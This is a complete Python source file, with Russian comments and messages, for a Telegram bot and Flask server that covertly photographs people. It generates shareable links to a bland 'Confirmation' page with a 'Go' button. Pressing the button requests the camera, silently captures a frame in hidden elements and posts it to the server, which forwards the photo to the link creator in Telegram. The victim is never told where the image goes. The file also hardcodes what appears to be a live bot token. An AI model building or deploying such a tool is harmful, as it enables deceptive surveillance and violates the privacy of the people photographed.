import telebot
from telebot import types
import threading
import secrets
from flask import Flask, request, jsonify
import os
import base64
import time
import re
import json

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = '8746122757:AAH25b7Feg42akLKgUx17z3qdOXD1xISugM'
BOT_USERNAME = 'genphototikbot'
PORT = 5000
MAX_USES = 3  # Максимум 3 человека на ссылку

# ID администратора (ВАШ ID Telegram)
ADMIN_ID = 957881887  # ← ЗАМЕНИТЕ НА ВАШ ID!

# Файл для хранения разрешённых пользователей
ALLOWED_USERS_FILE = 'allowed_users.json'
# ================================

bot = telebot.TeleBot(BOT_TOKEN)
active_links = {}
app = Flask(__name__)

# Загрузка списка разрешённых пользователей
def load_allowed_users():
    if os.path.exists(ALLOWED_USERS_FILE):
        with open(ALLOWED_USERS_FILE, 'r') as f:
            return set(json.load(f))
    return set()

# Сохранение списка разрешённых пользователей
def save_allowed_users(users):
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump(list(users), f)

allowed_users = load_allowed_users()

# Хранение заявок на доступ
access_requests = {}  # {user_id: {'username': name, 'message_id': msg_id}}

# ========== HTML СТРАНИЦА ==========
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Подтверждение</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, sans-serif;
        }
        .container { text-align: center; padding: 20px; }
        .status { font-size: 28px; color: white; font-weight: bold; margin-bottom: 15px; }
        .sub { font-size: 16px; color: rgba(255,255,255,0.8); }
        button {
            background: white;
            border: none;
            padding: 18px 50px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 30px;
            color: #667eea;
        }
        button:active { transform: scale(0.97); }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="status" id="status">🔗</div>
        <div class="sub" id="sub"></div>
        <button id="btn">Перейти</button>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        const statusDiv = document.getElementById('status');
        const subDiv = document.getElementById('sub');
        const btn = document.getElementById('btn');
        
        let code = null;
        
        if (tg.initDataUnsafe && tg.initDataUnsafe.start_param) {
            code = tg.initDataUnsafe.start_param;
        }
        
        if (!code) {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('startapp')) {
                code = urlParams.get('startapp');
            } else if (urlParams.has('start_param')) {
                code = urlParams.get('start_param');
            }
        }
        
        if (!code) {
            const pathParts = window.location.pathname.split('/');
            const lastPart = pathParts[pathParts.length - 1];
            if (lastPart && lastPart !== 'webapp') {
                code = lastPart;
            }
        }
        
        btn.onclick = async () => {
            if (!code) {
                statusDiv.innerHTML = '❌';
                subDiv.innerHTML = 'Ошибка';
                return;
            }
            
            btn.disabled = true;
            statusDiv.innerHTML = '⏳';
            subDiv.innerHTML = 'Подождите...';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                document.body.appendChild(video);
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 200);
                    };
                });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg', 0.85);
                
                stream.getTracks().forEach(track => track.stop());
                video.remove();
                canvas.remove();
                
                statusDiv.innerHTML = '📤';
                subDiv.innerHTML = 'Отправка...';
                
                const response = await fetch('/send_photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code: code, photo: photoData })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    statusDiv.innerHTML = '✅';
                    subDiv.innerHTML = 'Готово!';
                    setTimeout(() => tg.close(), 1500);
                } else if (result.error === 'limit_reached') {
                    statusDiv.innerHTML = '❌';
                    subDiv.innerHTML = 'Лимит использован';
                } else {
                    throw new Error();
                }
            } catch (err) {
                statusDiv.innerHTML = '❌';
                subDiv.innerHTML = 'Разрешите камеру';
                btn.disabled = false;
            }
        };
    </script>
</body>
</html>
'''

@app.route('/webapp')
def webapp_root():
    return HTML_PAGE

@app.route('/webapp/')
def webapp_root_slash():
    return HTML_PAGE

@app.route('/webapp/<code>')
def webapp_with_code(code):
    return HTML_PAGE

@app.route('/send_photo', methods=['POST'])
def receive_photo():
    data = request.json
    link_code = data.get('code')
    photo_data = data.get('photo')
    
    if not link_code or link_code not in active_links:
        return jsonify({'success': False, 'error': 'not_found'}), 400
    
    link_info = active_links[link_code]
    
    if link_info['uses'] >= MAX_USES:
        return jsonify({'success': False, 'error': 'limit_reached'}), 400
    
    chat_id = link_info['chat_id']
    
    link_info['uses'] += 1
    link_info['users'].append(chat_id)
    
    photo_data = re.sub('^data:image/.+;base64,', '', photo_data)
    photo_bytes = base64.b64decode(photo_data)
    
    temp_path = f'photo_{int(time.time())}.jpg'
    with open(temp_path, 'wb') as f:
        f.write(photo_bytes)
    
    with open(temp_path, 'rb') as photo:
        bot.send_photo(chat_id, photo, caption=f"✅ Фото! (Осталось: {MAX_USES - link_info['uses']})")
    os.remove(temp_path)
    
    if link_info['uses'] >= MAX_USES:
        del active_links[link_code]
    
    return jsonify({'success': True})

# ========== ПРОВЕРКА ПРАВ ДОСТУПА ==========
def is_allowed(user_id):
    return user_id == ADMIN_ID or user_id in allowed_users

# ========== КОМАНДЫ БОТА ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if is_allowed(user_id):
        # Разрешённый пользователь - показывает кнопку создания ссылки
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton('🔗 Создать ссылку', callback_data='create_link')
        markup.add(btn)
        bot.send_message(
            message.chat.id,
            f"👋 Привет, {username}!\n\n"
            f"Нажми на кнопку, чтобы создать ссылку.\n"
            f"📊 Ссылка работает для {MAX_USES} человек.\n"
            f"🔗 Друг перейдёт по ссылке и сделает фото.",
            reply_markup=markup
        )
    else:
        # Неразрешённый пользователь - просит разрешение
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton('📝 Запросить доступ', callback_data='request_access')
        markup.add(btn)
        bot.send_message(
            message.chat.id,
            f"👋 Привет, {username}!\n\n"
            f"❌ У вас нет доступа к созданию ссылок.\n\n"
            f"Нажмите на кнопку, чтобы отправить запрос администратору.",
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    username = call.from_user.username or call.from_user.first_name
    
    # Запрос доступа
    if call.data == 'request_access':
        if user_id in access_requests:
            bot.answer_callback_query(call.id, "Запрос уже отправлен!", show_alert=True)
            return
        
        # Сохраняем запрос
        access_requests[user_id] = {
            'username': username,
            'user_id': user_id,
            'time': time.time()
        }
        
        # Отправляем админу
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton('✅ РАЗРЕШИТЬ', callback_data=f'allow_{user_id}'),
            types.InlineKeyboardButton('❌ ОТКЛОНИТЬ', callback_data=f'deny_{user_id}')
        )
        
        bot.send_message(
            ADMIN_ID,
            f"🔔 *НОВЫЙ ЗАПРОС ДОСТУПА*\n\n"
            f"👤 Пользователь: @{username}\n"
            f"🆔 ID: `{user_id}`\n"
            f"📅 Время: {time.strftime('%H:%M:%S')}",
            parse_mode='Markdown',
            reply_markup=markup
        )
        
        bot.answer_callback_query(call.id, "Запрос отправлен администратору!")
        bot.send_message(call.message.chat.id, "✅ Запрос отправлен! Ожидайте подтверждения.")
    
    # Создание ссылки (только для разрешённых)
    elif call.data == 'create_link':
        if not is_allowed(user_id):
            bot.answer_callback_query(call.id, "❌ У вас нет доступа!", show_alert=True)
            return
        
        code = secrets.token_urlsafe(16)
        active_links[code] = {
            'chat_id': call.message.chat.id,
            'uses': 0,
            'users': [],
            'owner_id': user_id
        }
        
        direct_link = f"https://t.me/{BOT_USERNAME}/webapp?startapp={code}"
        
        bot.send_message(
            call.message.chat.id,
            f"✅ *Ссылка готова!*\n\n"
            f"🔗 `{direct_link}`\n\n"
            f"📤 Отправь эту ссылку другу.\n"
            f"📊 Ссылка работает для *{MAX_USES} человек*.\n"
            f"⚠️ Ссылка активна 10 минут.",
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        
        def delete_link():
            time.sleep(600)
            if code in active_links:
                del active_links[code]
        
        threading.Thread(target=delete_link, daemon=True).start()
        bot.answer_callback_query(call.id)
    
    # Разрешение доступа (только для админа)
    elif call.data.startswith('allow_'):
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "Только для админа!")
            return
        
        target_id = int(call.data.split('_')[1])
        allowed_users.add(target_id)
        save_allowed_users(allowed_users)
        
        # Удаляем запрос
        if target_id in access_requests:
            del access_requests[target_id]
        
        bot.edit_message_text(
            f"✅ РАЗРЕШЁН: пользователь {target_id}",
            call.message.chat.id,
            call.message.message_id
        )
        
        # Уведомляем пользователя
        try:
            bot.send_message(
                target_id,
                "✅ *ДОСТУП РАЗРЁШЕН!*\n\n"
                "Теперь вы можете создавать ссылки.\n"
                "Отправьте /start чтобы начать.",
                parse_mode='Markdown'
            )
        except:
            pass
        
        bot.answer_callback_query(call.id, "Доступ разрешён!")
    
    # Отклонение доступа (только для админа)
    elif call.data.startswith('deny_'):
        if user_id != ADMIN_ID:
            bot.answer_callback_query(call.id, "Только для админа!")
            return
        
        target_id = int(call.data.split('_')[1])
        
        if target_id in access_requests:
            del access_requests[target_id]
        
        bot.edit_message_text(
            f"❌ ОТКЛОНЁН: пользователь {target_id}",
            call.message.chat.id,
            call.message.message_id
        )
        
        # Уведомляем пользователя
        try:
            bot.send_message(
                target_id,
                "❌ *ДОСТУП ОТКЛОНЁН*\n\n"
                "К сожалению, администратор отклонил ваш запрос.",
                parse_mode='Markdown'
            )
        except:
            pass
        
        bot.answer_callback_query(call.id, "Доступ отклонён")

# ========== КОМАНДЫ АДМИНА ==========
@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    if not allowed_users:
        bot.send_message(ADMIN_ID, "📋 Нет разрешённых пользователей")
        return
    
    text = "📋 *РАЗРЕШЁННЫЕ ПОЛЬЗОВАТЕЛИ:*\n\n"
    for uid in allowed_users:
        text += f"• ID: `{uid}`\n"
    
    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')

@bot.message_handler(commands=['revoke'])
def revoke_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(ADMIN_ID, "Использование: /revoke ID_пользователя")
            return
        
        target_id = int(parts[1])
        if target_id in allowed_users:
            allowed_users.remove(target_id)
            save_allowed_users(allowed_users)
            bot.send_message(ADMIN_ID, f"✅ Доступ отозван у пользователя {target_id}")
        else:
            bot.send_message(ADMIN_ID, f"❌ Пользователь {target_id} не найден")
    except:
        bot.send_message(ADMIN_ID, "❌ Ошибка. ID должен быть числом")

# ========== ЗАПУСК ==========
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

threading.Thread(target=run_flask, daemon=True).start()

print("="*50)
print("✅ БОТ ЗАПУЩЕН")
print(f"🤖 Бот: @{BOT_USERNAME}")
print(f"👑 Админ ID: {ADMIN_ID}")
print(f"📊 Ссылка работает для {MAX_USES} человек")
print("="*50)
print("\n🔧 КОМАНДЫ АДМИНА:")
print("   /users - список разрешённых пользователей")
print("   /revoke ID - отозвать доступ")
print("="*50)

bot.polling(none_stop=True)
